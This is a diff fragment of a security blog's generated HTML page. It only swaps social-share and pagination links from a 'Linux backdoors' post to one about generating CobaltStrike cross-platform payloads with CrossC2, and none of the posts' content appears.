+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f&amp;title=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;summary=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;source=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -319,7 +387,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f&amp;resubmit=true&amp;title=Linux%20backdoors" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f&amp;resubmit=true&amp;title=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -327,7 +395,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f;title=Linux%20backdoors" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f;title=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -335,7 +403,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Linux%20backdoors%20https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload%20https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -343,7 +411,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f&amp;t=Linux%20backdoors" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f&amp;t=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -351,7 +419,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Linux%20backdoors&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -369,18 +437,11 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 
         <div class="pagination__buttons">
             
-            <span class="button previous">
-                <a href="https://tranquac.github.io/posts/2021/07/androi-pentest-note/">
-                    <span class="button__icon">←</span>
-                    <span class="button__text">Androi Pentest Note</span>
-                </a>
-            </span>
-            
 
             
             <span class="button next">
-                <a href="https://tranquac.github.io/posts/2021/06/sql/">
-                    <span class="button__text">SQL</span>
+                <a href="https://tranquac.github.io/posts/2021/08/my-notes-on-code-review/">
+                    <span class="button__text">My Notes on Code-Review</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
